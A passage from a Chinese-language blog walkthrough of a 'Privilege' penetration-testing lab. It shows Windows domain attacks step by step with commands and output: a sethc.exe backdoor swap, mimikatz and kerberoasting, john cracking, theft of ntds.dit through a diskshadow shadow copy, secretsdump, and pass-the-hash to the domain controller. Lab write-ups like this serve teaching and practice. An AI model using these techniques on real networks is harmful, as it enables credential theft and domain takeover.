  / _<span class="token variable"><span class="token variable">`</span> <span class="token operator">|</span>   ___     ___    __<span class="token operator">|</span> <span class="token operator">|</span>     o O O    <span class="token operator">|</span> <span class="token operator">|</span>    ___   <span class="token operator">|</span> <span class="token operator">|</span>__   
  <span class="token punctuation">\</span>__, <span class="token operator">|</span>  / _ <span class="token punctuation">\</span>   / _ <span class="token punctuation">\</span>  / _<span class="token variable">`</span></span> <span class="token operator">|</span>    o        _/ <span class="token operator">|</span>   / _ <span class="token punctuation">\</span>  <span class="token operator">|</span> <span class="token string">'_ \  
  |___/   \___/   \___/  \__,_|   TS__[O]  |__/_   \___/  |_.__/  
_|"""""|_|"""""|_|"""""|_|"""""| &#123;======|_|"""""|_|"""""|_|"""""| 
"`-0-0-'</span>"<span class="token variable"><span class="token variable">`</span>-0-0-'"<span class="token variable">`</span></span>-0-0-<span class="token string">'"`-0-0-'</span>./o--000<span class="token string">'"`-0-0-'</span>"<span class="token variable"><span class="token variable">`</span>-0-0-'"<span class="token variable">`</span></span>-0-0-' 

flag02: flag<span class="token punctuation">&#123;</span>447e9add-e7ad-469e-8c93-76c31b284239<span class="token punctuation">&#125;</span></code></pre>
<h2 id="SeRestorePrivilege提权"><a href="#SeRestorePrivilege提权" class="headerlink" title="SeRestorePrivilege提权"></a>SeRestorePrivilege提权</h2><p>第三关是打办公区内网，应该是机器用户<code>172.22.14.46</code><br><img src="https://s1.imagehub.cc/images/2025/02/15/33ba5c7bfccffb8aa1f04153ac1ccacd.png" alt="image" loading="lazy"><br>有个仓库里面有一些用户名和密码，找到<code>XR-0923</code>这台机器的</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">XR-0923 <span class="token operator">|</span> zhangshuai <span class="token operator">|</span> wSbEajHzZs</code></pre>
<p>rdp可以登录,尝试提权</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">
C:<span class="token punctuation">\</span>Users<span class="token punctuation">\</span>zhangshuai<span class="token operator">></span>netstat <span class="token parameter variable">-a</span>

活动连接

  协议  本地地址          外部地址        状态
  TCP    <span class="token number">0.0</span>.0.0:80             XR-0923:0              LISTENING
  TCP    <span class="token number">0.0</span>.0.0:135            XR-0923:0              LISTENING
  TCP    <span class="token number">0.0</span>.0.0:445            XR-0923:0              LISTENING
  TCP    <span class="token number">0.0</span>.0.0:3389           XR-0923:0              LISTENING
  TCP    <span class="token number">0.0</span>.0.0:5985           XR-0923:0              LISTENING
  TCP    <span class="token number">0.0</span>.0.0:15774          XR-0923:0              LISTENING
  TCP    <span class="token number">0.0</span>.0.0:47001          XR-0923:0              LISTENING
  TCP    <span class="token number">0.0</span>.0.0:49664          XR-0923:0              LISTENING
  TCP    <span class="token number">0.0</span>.0.0:49665          XR-0923:0              LISTENING
  TCP    <span class="token number">0.0</span>.0.0:49666          XR-0923:0              LISTENING
  TCP    <span class="token number">0.0</span>.0.0:49667          XR-0923:0              LISTENING
  TCP    <span class="token number">0.0</span>.0.0:49668          XR-0923:0              LISTENING
  TCP    <span class="token number">0.0</span>.0.0:49669          XR-0923:0              LISTENING
  TCP    <span class="token number">0.0</span>.0.0:49670          XR-0923:0              LISTENING
  TCP    <span class="token number">0.0</span>.0.0:49671          XR-0923:0              LISTENING
  TCP    <span class="token number">0.0</span>.0.0:49676          XR-0923:0              LISTENING
  TCP    <span class="token number">127.0</span>.0.1:15579        XR-0923:0              LISTENING
  TCP    <span class="token number">127.0</span>.0.1:49674        XR-0923:49675          ESTABLISHED
  TCP    <span class="token number">127.0</span>.0.1:49675        XR-0923:49674          ESTABLISHED
  TCP    <span class="token number">172.22</span>.14.46:139       XR-0923:0              LISTENING</code></pre>
<p>发现5985(winrm)端口开放，于是可以winrm登录一手</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">root@kali2 <span class="token punctuation">[</span>/tmp<span class="token punctuation">]</span> ➜  proxychains4 <span class="token parameter variable">-q</span> evil-winrm <span class="token parameter variable">-i</span> <span class="token number">172.22</span>.14.46 <span class="token parameter variable">-u</span> zhangshuai <span class="token parameter variable">-p</span> wSbEajHzZs              <span class="token punctuation">[</span><span class="token number">14</span>:56:36<span class="token punctuation">]</span>
                                        
Evil-WinRM shell v3.5
                                        
Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">function</span> is unimplemented on this machine
                                        
Data: For <span class="token function">more</span> information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm<span class="token comment">#Remote-path-completion</span>
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:<span class="token punctuation">\</span>Users<span class="token punctuation">\</span>zhangshuai<span class="token punctuation">\</span>Documents<span class="token operator">></span> <span class="token function">whoami</span> /priv

特权信息
----------------------

特权名                        描述           状态
<span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">=</span> <span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span> <span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span>
SeRestorePrivilege            还原文件和目录 已启用
SeChangeNotifyPrivilege       绕过遍历检查   已启用
SeIncreaseWorkingSetPrivilege 增加进程工作集 已启用</code></pre>
<p>存在<code>SeRestorePrivilege</code>权限,用来实现恢复操作，对当前系统任意文件具有写权限<br>利用思路1</p>
<pre class="language-none"><code class="language-none">1.获得SeRestorePrivilege权限，修改注册表HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options
2.劫持exe文件的启动
3.实现提权或是作为后门</code></pre>
<p>利用思路2</p>
<pre class="language-none"><code class="language-none">1.获得SeRestorePrivilege权限，向任意路径写入dll文件
2.实现dll劫持
3.实现提权或是作为后门</code></pre>
<p>直接将cmd.exe改名为 sethc.exe</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">*Evil-WinRM* PS C:<span class="token punctuation">\</span>windows<span class="token punctuation">\</span>system3<span class="token operator"><span class="token file-descriptor important">2</span>></span> ren sethc.exe sethc.exe.bak
*Evil-WinRM* PS C:<span class="token punctuation">\</span>windows<span class="token punctuation">\</span>system3<span class="token operator"><span class="token file-descriptor important">2</span>></span> ren cmd.exe sethc.exe</code></pre>
<p>shift 5次后cmd创建后门用户,拿到flag3</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">O~~~~~~~                           O~~                             
O~~    O~~        O~            O~ O~~                             
O~~    O~~O~ O~~~   O~~     O~~    O~~   O~~       O~~      O~~    
O~~~~~~~   O~~   O~~ O~~   O~~ O~~ O~~ O~   O~~  O~~  O~~ O~   O~~ 
O~~        O~~   O~~  O~~ O~~  O~~ O~~O~~~~~ O~~O~~   O~~O~~~~~ O~~
O~~        O~~   O~~   O~O~~   O~~ O~~O~         O~~  O~~O~        
O~~       O~~~   O~~    O~~    O~~O~~~  O~~~~        O~~   O~~~~   
                                                  O~~              


flag03: flag<span class="token punctuation">&#123;</span>8a53a8f2-3434-4dcd-aa8f-35093e864935<span class="token punctuation">&#125;</span>
</code></pre>
<h2 id="卷影拷贝"><a href="#卷影拷贝" class="headerlink" title="卷影拷贝"></a>卷影拷贝</h2><p>mimikatz收集域内哈希,由于win10原因，高版本mimikatz抓不了，用2.0版本可以抓</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">msv <span class="token builtin class-name">:</span>
 <span class="token punctuation">[</span>00000003<span class="token punctuation">]</span> Primary
 * Username <span class="token builtin class-name">:</span> XR-0923$
 * Domain   <span class="token builtin class-name">:</span> XIAORANG
 * NTLM     <span class="token builtin class-name">:</span> 17d03bb11921e25f888ba9a07275affe
 * SHA1     <span class="token builtin class-name">:</span> 1fdc735e13762537150c4fb286ef5b75d60f5902</code></pre>
<p>拿到机器用户<code>XR-0923$</code>的哈希,尝试kerberoasting攻击</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">root@kali2 <span class="token punctuation">[</span>~<span class="token punctuation">]</span> ➜  proxychains4 <span class="token parameter variable">-q</span> GetUserSPNs.py <span class="token parameter variable">-request</span> -dc-ip <span class="token number">172.22</span>.14.11 xiaorang.lab/<span class="token string">'XR-0923$'</span> <span class="token parameter variable">-hashes</span>  :17d03bb11921e25f888ba9a07275affe
Impacket v0.9.24 - Copyright <span class="token number">2021</span> SecureAuth Corporation

ServicePrincipalName           Name      MemberOf                                                  PasswordLastSet             LastLogon  Delegation 
-----------------------------  --------  --------------------------------------------------------  --------------------------  ---------  ----------
TERMSERV/xr-0923.xiaorang.lab  tianjing  <span class="token assign-left variable">CN</span><span class="token operator">=</span>Remote Management Users,CN<span class="token operator">=</span>Builtin,DC<span class="token operator">=</span>xiaorang,DC<span class="token operator">=</span>lab  <span class="token number">2023</span>-05-30 <span class="token number">18</span>:25:11.564883  <span class="token operator">&lt;</span>never<span class="token operator">></span>               
WWW/xr-0923.xiaorang.lab/IIS   tianjing  <span class="token assign-left variable">CN</span><span class="token operator">=</span>Remote Management Users,CN<span class="token operator">=</span>Builtin,DC<span class="token operator">=</span>xiaorang,DC<span class="token operator">=</span>lab  <span class="token number">2023</span>-05-30 <span class="token number">18</span>:25:11.564883  <span class="token operator">&lt;</span>never<span class="token operator">></span>               



<span class="token variable">$krb5tgs</span><span class="token variable">$23</span><span class="token variable">$*</span>tianjing<span class="token variable">$XIAORANG</span>.LAB<span class="token variable">$xiaorang</span>.lab/tianjing*<span class="token variable">$d88d10a478390ca67a9df69443677e3d</span><span class="token variable">$96f635afc1070c61eb0eb4f991f8fd37935fff76dc7752104616e95c94c2a08197598f3b4809cc3796cd5105db3113dcfece82ca201b2a0dafe32f733cbee291161c482d1e7ea98de7fb5841113f2285175d0f71bf959e3b1238d2800f9fcba1c9b582c840032c63c44adb0e6d1ed8b923fdac2953e8426d49af769ffda5ec716bde5d5a6e50251bd2d5b87981c6674a69404ef52d6cc27a7e58e9c3c71d882a9e07efcd0a0353ee68a491ef758f689ba938ac57b3a150b7bf3caaa9862b8119c343de77bbdbbebc70b548baf9ff12151f1c2e53f63ad84ee636feab78b6384bc662f040e23c83f606b1fe98f80e7c5944b1b2805f65d3a666f2554aa132cc4ebd5e9cc5507959b2da4360fa597c3f9ebc54fb585d95732c57931e4543b25c4147853b1201ab59665069ef9740e2f213a6dd66403d42a4b2e35d5b38318eaa9db5bdcf34af179e554a8f0f2c337fb0a15c84c185af8ea9d2bd6e11aaf2e51c859e23042e860ac66e4879e387b0bc8eabfbda7f87f9c7435571364ddd207c26a03eb65e2be54d434fa8daf5e37b51b7969330c36fc7f8c458b26f70db05b0762eae37bb98ee28434710649703ec55712296f826e634a4854ce65e798142e31f633436479ca4904179cff8d280e011669f09b177e0158f97c32d19e43b6b170b62bcdbb146e554d4ac9ea2f41e1e12d85d12698103aca9ae85d15fdc293cb615134e1c4c7dd16f48840b9cacb4439e8178524d032555a94515a4318e8b7cf03c020efae1995caf234a7842317964d5be37b8a2b82a6eece467b65895d2225568f57bfd68ae6142e8f0da59727740e123a695b9ff516f5c9e810d301c145f653332bcbbab6fbe6c7204a2c2875edfa6a926bf7f797bac32b1cb3bcab4ff84b4182549efaab66c00c36c4c0f434d0f65cca2f99638a2694a671e2ec4055e902e9f4516f1013006ab8c1022eb618b952a0b35f0087c60ea8740ad3b36062067b9267ef3240bccc26ef47bee58c40d0ee6d95983b013f68e44ab77af6a1af846baeb134f76802e357f09c50a120e5179fc7931e3e1c64798c9a79000fa5c6cab79bc54b249b41c430010da53cdd794243005250b1098a02fc7066aeb905511281de8720e9b985c16bcf577a211d4bea537c4793aad65f35809defd69101db432ab782b5879e7f67ef0081bdc1603d17b5e26f5efbb326c08786102b878a371229199d37238a93916a3aafb5c4e363d8ee37bda21bc84217af924679aaf8bed02f9c030d5ddffd24c29f948dfa265fd8fee5c4aad8b0def8213a71876680b52f4ca2200936b10cab5e232aefab4008fdf561756daeaec8d47563119e368cb97087a86e764f4fa3e4e05aaa1a24abc44b9d8123e0c8ee1c818c760104dd6167b87560844e2982c8a734dffdf5350e8c3681cafb959f4dba2f05401caa9bc3d9974e955d1e4930021fb27a2d2b706ff7853141381fd87b0877f</span></code></pre>
<p>拿到用户tainjing的哈希,john跑出密码是<code>DPQSXSXgh2</code></p>
<pre class="language-bash" data-language="bash"><code class="language-bash">root@kali2 <span class="token punctuation">[</span>/tmp<span class="token punctuation">]</span> ➜  john aaa <span class="token parameter variable">--wordlist</span><span class="token operator">=</span>/usr/share/wordlists/rockyou.txt                                <span class="token punctuation">[</span><span class="token number">16</span>:05:57<span class="token punctuation">]</span>
Using default input encoding: UTF-8
Loaded <span class="token number">1</span> password <span class="token builtin class-name">hash</span> <span class="token punctuation">(</span>krb5tgs, Kerberos <span class="token number">5</span> TGS etype <span class="token number">23</span> <span class="token punctuation">[</span>MD4 HMAC-MD5 RC4<span class="token punctuation">]</span><span class="token punctuation">)</span>
Warning: invalid UTF-8 seen reading ~/.john/john.pot
Press <span class="token string">'q'</span> or Ctrl-C to abort, almost any other key <span class="token keyword">for</span> status
DPQSXSXgh2       <span class="token punctuation">(</span>?<span class="token punctuation">)</span>     
1g <span class="token number">0</span>:00:00:17 DONE <span class="token punctuation">(</span><span class="token number">2025</span>-02-15 <span class="token number">16</span>:06<span class="token punctuation">)</span> <span class="token number">0</span>.05567g/s 626266p/s 626266c/s 626266C/s DQ22888911<span class="token punctuation">..</span>DPJGB130295
Use the <span class="token string">"--show"</span> option to display all of the cracked passwords reliably
Session completed.</code></pre>
<p>evil-winrm登上域控查看一下权限</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">root@kali2 <span class="token punctuation">[</span>/tmp<span class="token punctuation">]</span> ➜  proxychains4 <span class="token parameter variable">-q</span> evil-winrm <span class="token parameter variable">-i</span> <span class="token number">172.22</span>.14.11 <span class="token parameter variable">-u</span> tianjing <span class="token parameter variable">-p</span> DPQSXSXgh2                <span class="token punctuation">[</span><span class="token number">16</span>:06:57<span class="token punctuation">]</span>
                                        
Evil-WinRM shell v3.5
                                        
Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">function</span> is unimplemented on this machine
                                        
Data: For <span class="token function">more</span> information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm<span class="token comment">#Remote-path-completion</span>
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:<span class="token punctuation">\</span>Users<span class="token punctuation">\</span>tianjing<span class="token punctuation">\</span>Documents<span class="token operator">></span> 

*Evil-WinRM* PS C:<span class="token punctuation">\</span>Users<span class="token punctuation">\</span>tianjing<span class="token punctuation">\</span>Documents<span class="token operator">></span> <span class="token function">whoami</span> /priv

特权信息
----------------------

特权名                        描述             状态
<span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">=</span> <span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span> <span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span>
SeMachineAccountPrivilege     将工作站添加到域 已启用
SeBackupPrivilege             备份文件和目录   已启用
SeRestorePrivilege            还原文件和目录   已启用
SeShutdownPrivilege           关闭系统         已启用
SeChangeNotifyPrivilege       绕过遍历检查     已启用
SeIncreaseWorkingSetPrivilege 增加进程工作集   已启用</code></pre>
<p>使用<code>SeBackupPrivilege</code>提权<br>参考<a target="_blank" rel="noopener" href="https://github.com/xiaoy-sec/Pentest_Note/blob/master/wiki/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/Windows%E6%8F%90%E6%9D%83/SeBackupPrivilege.md">https://github.com/xiaoy-sec/Pentest_Note/blob/master/wiki/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/Windows%E6%8F%90%E6%9D%83/SeBackupPrivilege.md</a></p>
<pre class="language-bash" data-language="bash"><code class="language-bash">root@kali2 <span class="token punctuation">[</span>/tmp<span class="token punctuation">]</span> ➜  <span class="token function">cat</span> raj.dsh                                                                         <span class="token punctuation">[</span><span class="token number">16</span>:09:15<span class="token punctuation">]</span>
<span class="token builtin class-name">set</span> context persistent nowriters
<span class="token function">add</span> volume c: <span class="token builtin class-name">alias</span> raj
create
expose %raj% z:
root@kali2 <span class="token punctuation">[</span>/tmp<span class="token punctuation">]</span> ➜  unix2dos raj.dsh                                                                    <span class="token punctuation">[</span><span class="token number">16</span>:09:18<span class="token punctuation">]</span>
unix2dos: converting <span class="token function">file</span> raj.dsh to DOS format<span class="token punctuation">..</span>.</code></pre>

<pre class="language-bash" data-language="bash"><code class="language-bash">*Evil-WinRM* PS C:<span class="token punctuation">\</span>aaa<span class="token operator">></span> upload raj.dsh
                                        
Info: Uploading /tmp/raj.dsh to C:<span class="token punctuation">\</span>aaa<span class="token punctuation">\</span>raj.dsh
                                        
Data: <span class="token number">112</span> bytes of <span class="token number">112</span> bytes copied
                                        
Info: Upload successful<span class="token operator">!</span>
*Evil-WinRM* PS C:<span class="token punctuation">\</span>aaa<span class="token operator">></span> <span class="token function">dir</span>


    目录: C:<span class="token punctuation">\</span>aaa


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a----         <span class="token number">2</span>/15/2025   <span class="token number">4</span>:11 PM             <span class="token number">84</span> raj.dsh</code></pre>
<pre class="language-bash" data-language="bash"><code class="language-bash">*Evil-WinRM* PS C:<span class="token punctuation">\</span>aaa<span class="token operator">></span> diskshadow /s raj.dsh
Microsoft DiskShadow 版本 <span class="token number">1.0</span>
版权所有 <span class="token punctuation">(</span>C<span class="token punctuation">)</span> <span class="token number">2013</span> Microsoft Corporation
在计算机上: XR-DC，2025/2/15 <span class="token number">16</span>:15:01

-<span class="token operator">></span> <span class="token builtin class-name">set</span> context persistent nowriters
-<span class="token operator">></span> <span class="token function">add</span> volume c: <span class="token builtin class-name">alias</span> raj
-<span class="token operator">></span> create
已将卷影 ID <span class="token punctuation">&#123;</span>87d26219-7080-4ec0-aec1-8c87e2eb268c<span class="token punctuation">&#125;</span> 的别名 raj 设置为环境变量。
已将卷影集 ID <span class="token punctuation">&#123;</span>97c36faa-b1ae-45b9-b200-a39f33d54ccb<span class="token punctuation">&#125;</span> 的别名 VSS_SHADOW_SET 设置为环境变量。

正在查询卷影副本集 ID 为 <span class="token punctuation">&#123;</span>97c36faa-b1ae-45b9-b200-a39f33d54ccb<span class="token punctuation">&#125;</span> 的所有卷影副本

        * 卷影副本 ID <span class="token operator">=</span> <span class="token punctuation">&#123;</span>87d26219-7080-4ec0-aec1-8c87e2eb268c<span class="token punctuation">&#125;</span>          %raj%
                - 卷影副本集: <span class="token punctuation">&#123;</span>97c36faa-b1ae-45b9-b200-a39f33d54ccb<span class="token punctuation">&#125;</span>    %VSS_SHADOW_SET%
                - 卷影副本原始数 <span class="token operator">=</span> <span class="token number">1</span>
                - 原始卷名称: <span class="token punctuation">\</span><span class="token punctuation">\</span>?<span class="token punctuation">\</span>Volume<span class="token punctuation">&#123;</span>4790f32e-0000-0000-0000-100000000000<span class="token punctuation">&#125;</span><span class="token punctuation">\</span> <span class="token punctuation">[</span>C:<span class="token punctuation">\</span><span class="token punctuation">]</span>
                - 创建时间: <span class="token number">2025</span>/2/15 <span class="token number">16</span>:15:02
                - 卷影副本设备名称: <span class="token punctuation">\</span><span class="token punctuation">\</span>?<span class="token punctuation">\</span>GLOBALROOT<span class="token punctuation">\</span>Device<span class="token punctuation">\</span>HarddiskVolumeShadowCopy1
                - 原始计算机: XR-DC.xiaorang.lab
                - 服务计算机: XR-DC.xiaorang.lab
                - 未暴露
                - 提供程序 ID: <span class="token punctuation">&#123;</span>b5946137-7b9f-4925-af80-51abd60b20d5<span class="token punctuation">&#125;</span>
                - 属性:  No_Auto_Release Persistent No_Writers Differential

已列出的卷影副本数: <span class="token number">1</span>
-<span class="token operator">></span> expose %raj% z:
-<span class="token operator">></span> %raj% <span class="token operator">=</span> <span class="token punctuation">&#123;</span>87d26219-7080-4ec0-aec1-8c87e2eb268c<span class="token punctuation">&#125;</span>
已成功将卷影副本暴露为 z:<span class="token punctuation">\</span>。
-<span class="token operator">></span></code></pre>
<pre class="language-bash" data-language="bash"><code class="language-bash">RoboCopy /b z:<span class="token punctuation">\</span>windows<span class="token punctuation">\</span>ntds <span class="token builtin class-name">.</span> ntds.dit</code></pre>
<pre class="language-bash" data-language="bash"><code class="language-bash">*Evil-WinRM* PS C:<span class="token punctuation">\</span>aaa<span class="token operator">></span> reg save hklm<span class="token punctuation">\</span>system system
*Evil-WinRM* PS C:<span class="token punctuation">\</span>aaa<span class="token operator">></span> download ntds.dit
*Evil-WinRM* PS C:<span class="token punctuation">\</span>aaa<span class="token operator">></span> download system</code></pre>
<p>nm下半天,然后dump哈希</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">root@kali2 <span class="token punctuation">[</span>/tmp<span class="token punctuation">]</span> ➜  secretsdump.py  <span class="token parameter variable">-ntds</span> ntds.dit <span class="token parameter variable">-system</span> system <span class="token builtin class-name">local</span>                                 <span class="token punctuation">[</span><span class="token number">16</span>:33:05<span class="token punctuation">]</span>
Impacket v0.9.24 - Copyright <span class="token number">2021</span> SecureAuth Corporation

<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Target system bootKey: 0x4d1852164a0b068f32110659820cd4bc
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Dumping Domain Credentials <span class="token punctuation">(</span>domain<span class="token punctuation">\</span>uid:rid:lmhash:nthash<span class="token punctuation">)</span>
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Searching <span class="token keyword">for</span> pekList, be patient
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> PEK <span class="token comment"># 0 found and decrypted: 8cca939cb8a94a304d33209b41a99517</span>
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Reading and decrypting hashes from ntds.dit 
Administrator:500:aad3b435b51404eeaad3b435b51404ee:70c39b547b7d8adec35ad7c09fb1d277:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::</code></pre>
<p>拿到域管哈希<code>70c39b547b7d8adec35ad7c09fb1d277</code><br>pth拿flag</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">root@kali2 <span class="token punctuation">[</span>~<span class="token punctuation">]</span> ➜  proxychains4 <span class="token parameter variable">-q</span> evil-winrm <span class="token parameter variable">-i</span> <span class="token number">172.22</span>.14.11 <span class="token parameter variable">-u</span> Administrator <span class="token parameter variable">-H</span> 70c39b547b7d8adec35ad7c09fb1d277
*Evil-WinRM* PS C:<span class="token punctuation">\</span>Users<span class="token punctuation">\</span>Administrator<span class="token punctuation">\</span>flag<span class="token operator">></span> <span class="token builtin class-name">type</span> flag04.txt
.______   .______       __  ____    ____  __   __       _______   _______  _______
<span class="token operator">|</span>   _  <span class="token punctuation">\</span>  <span class="token operator">|</span>   _  <span class="token punctuation">\</span>     <span class="token operator">|</span>  <span class="token operator">|</span> <span class="token punctuation">\</span>   <span class="token punctuation">\</span>  /   / <span class="token operator">|</span>  <span class="token operator">|</span> <span class="token operator">|</span>  <span class="token operator">|</span>     <span class="token operator">|</span>   ____<span class="token operator">|</span> /  _____<span class="token operator">||</span>   ____<span class="token operator">|</span>
<span class="token operator">|</span>  <span class="token operator">|</span>_<span class="token punctuation">)</span>  <span class="token operator">|</span> <span class="token operator">|</span>  <span class="token operator">|</span>_<span class="token punctuation">)</span>  <span class="token operator">|</span>    <span class="token operator">|</span>  <span class="token operator">|</span>  <span class="token punctuation">\</span>   <span class="token punctuation">\</span>/   /  <span class="token operator">|</span>  <span class="token operator">|</span> <span class="token operator">|</span>  <span class="token operator">|</span>     <span class="token operator">|</span>  <span class="token operator">|</span>__   <span class="token operator">|</span>  <span class="token operator">|</span>  __  <span class="token operator">|</span>  <span class="token operator">|</span>__
<span class="token operator">|</span>   ___/  <span class="token operator">|</span>      /     <span class="token operator">|</span>  <span class="token operator">|</span>   <span class="token punctuation">\</span>      /   <span class="token operator">|</span>  <span class="token operator">|</span> <span class="token operator">|</span>  <span class="token operator">|</span>     <span class="token operator">|</span>   __<span class="token operator">|</span>  <span class="token operator">|</span>  <span class="token operator">|</span> <span class="token operator">|</span>_ <span class="token operator">|</span> <span class="token operator">|</span>   __<span class="token operator">|</span>
<span class="token operator">|</span>  <span class="token operator">|</span>      <span class="token operator">|</span>  <span class="token operator">|</span><span class="token punctuation">\</span>  <span class="token punctuation">\</span>----.<span class="token operator">|</span>  <span class="token operator">|</span>    <span class="token punctuation">\</span>    /    <span class="token operator">|</span>  <span class="token operator">|</span> <span class="token operator">|</span>  <span class="token variable"><span class="token variable">`</span>----.<span class="token operator">|</span>  <span class="token operator">|</span>____ <span class="token operator">|</span>  <span class="token operator">|</span>__<span class="token operator">|</span> <span class="token operator">|</span> <span class="token operator">|</span>  <span class="token operator">|</span>____
<span class="token operator">|</span> _<span class="token operator">|</span>      <span class="token operator">|</span> _<span class="token operator">|</span> <span class="token variable">`</span></span>._____<span class="token operator">||</span>__<span class="token operator">|</span>     <span class="token punctuation">\</span>__/     <span class="token operator">|</span>__<span class="token operator">|</span> <span class="token operator">|</span>_______<span class="token operator">||</span>_______<span class="token operator">|</span> <span class="token punctuation">\</span>______<span class="token operator">|</span> <span class="token operator">|</span>_______<span class="token operator">|</span>

Good job<span class="token operator">!</span>

flag04: flag<span class="token punctuation">&#123;</span>1984fc41-3b3c-45a6-8c41-ad09205d6e72<span class="token punctuation">&#125;</span></code></pre>
























</div></section><ul class="post-copyright"><li class="post-copyright-author"><strong>本文作者：</strong>ta0</li><li class="post-copyright-link"><strong>本文链接：</strong><a href="http://ta0.fun/posts/cb0f9c73/" title="春秋云境-Privilege">http://ta0.fun/posts/cb0f9c73/</a></li><li class="post-copyright-license"><strong>版权声明：</strong>本博客所有文章除特别声明外，均默认采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" target="_blank" rel="noopener" title="CC BY-NC-SA 4.0 "><span class="icon iconify" data-icon="ri:creative-commons-line"></span><span class="icon iconify" data-icon="ri:creative-commons-by-line"></span><span class="icon iconify" data-icon="ri:creative-commons-nc-line"></span><span class="icon iconify" data-icon="ri:creative-commons-sa-line"></span></a> 许可协议。</li></ul></article><div class="post-nav"><div class="post-nav-item"><a class="post-nav-prev" href="/posts/b7e54991/" rel="prev" title="Vulnhub-Mercy"><span class="icon iconify" data-icon="ri:arrow-left-s-line"></span><span class="post-nav-text">Vulnhub-Mercy</span></a></div><div class="post-nav-item"><a class="post-nav-next" href="/posts/a0288562/" rel="next" title="春秋云境-Tsclient"><span class="post-nav-text">春秋云境-Tsclient</span><span class="icon iconify" data-icon="ri:arrow-right-s-line"></span></a></div></div></div><div class="hty-card" id="comment"></div></main><footer class="sidebar-translate" id="footer"><div class="copyright"><span>&copy; 2019 – 2025 </span><span class="with-love" id="animate"><span class="icon iconify" data-icon="ri:cloud-line"></span></span><span class="author"> ta0</span></div><div class="powered"><span>由 <a href="https://hexo.io" target="_blank" rel="noopener">Hexo</a> 驱动 v7.1.1</span><span class="footer-separator">|</span><span>主题 - <a rel="noopener" href="https://github.com/YunYouJun/hexo-theme-yun" target="_blank"><span>Yun</span></a> v1.10.11</span></div><div id="busuanzi"><span id="busuanzi_container_site_uv" title="总访客量"><span><span class="icon iconify" data-icon="ri:user-line"></span></span><span id="busuanzi_value_site_uv"></span></span><span class="footer-separator">|</span><span id="busuanzi_container_site_pv" title="总访问量"><span><span class="icon iconify" data-icon="ri:eye-line"></span></span><span id="busuanzi_value_site_pv"></span></span><script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></footer></div><a class="hty-icon-button" id="back-to-top" aria-label="back-to-top" href="#"><span class="icon iconify" data-icon="ri:arrow-up-s-line"></span><svg class="progress-circle-container" viewBox="0 0 100 100"><circle class="progress-circle" id="progressCircle" cx="50" cy="50" r="48" fill="none" stroke="#0078E7" stroke-width="2" stroke-linecap="round"></circle></svg></a><a class="popup-trigger hty-icon-button icon-search" id="search" href="javascript:;" title="搜索"><span class="site-state-item-icon"><span class="icon iconify" data-icon="ri:search-line"></span></span></a><script>window.addEventListener("DOMContentLoaded", () => {
  // Handle and trigger popup window
  document.querySelector(".popup-trigger").addEventListener("click", () => {
    document.querySelector(".popup").classList.add("show");
    setTimeout(() => {
      document.querySelector(".search-input").focus();
    }, 100);
  });

  // Monitor main search box
  const onPopupClose = () => {
    document.querySelector(".popup").classList.remove("show");
  };

  document.querySelector(".popup-btn-close").addEventListener("click", () => {
    onPopupClose();
  });

  window.addEventListener("keyup", event => {
    if (event.key === "Escape") {
      onPopupClose();
    }
  });
});
</script><script src="https://fastly.jsdelivr.net/npm/hexo-generator-searchdb@1.4.0/dist/search.js"></script><script src="/js/search/local-search.js" defer type="module"></script><div class="popup search-popup"><div class="search-header"><span class="popup-btn-close close-icon hty-icon-button"><span class="icon iconify" data-icon="ri:close-line"></span></span></div><div class="search-input-container"><input class="search-input" id="local-search-input" type="text" placeholder="搜索..." value=""></div><div class="search-result-container"></div></div><script src="https://fastly.jsdelivr.net/npm/medium-zoom@1.0.6/dist/medium-zoom.min.js"></script><script>const images = [...document.querySelectorAll('.markdown-body img')]
